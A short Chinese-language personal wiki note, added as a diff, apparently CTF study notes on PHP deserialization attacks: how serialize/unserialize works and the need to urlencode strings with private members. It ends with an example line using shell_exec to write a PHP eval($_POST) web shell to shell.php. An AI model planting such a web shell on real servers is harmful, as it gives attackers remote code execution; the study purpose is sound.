@@ -1,0 +1,24 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-24T18:42:56+08:00
+
+====== 反序列化 ======
+Created 星期日 24 十一月 2024
+
+https://hello-ctf.com/HC_Web/php_unser_base
+
+如果php本来定义了一个类，可以通过序列化该类的对象，得到一个字符串，再用反序列化还原该对象。
+
+通过上传序列化字符串，在服务器反序列化，可以构造含恶意代码的对象。
+
+serialize(obj): string
+unserialize(string): obj
+
+
+注意点：
+当有protected、private变量、或特殊控制字符时，序列化后的字符串会有不可见字符，
+需要套一层urlencode()再上传
+
+
+举例：
+shell_exec('echo "<?php eval($_POST[\'shell\']); ?>" > shell.php')
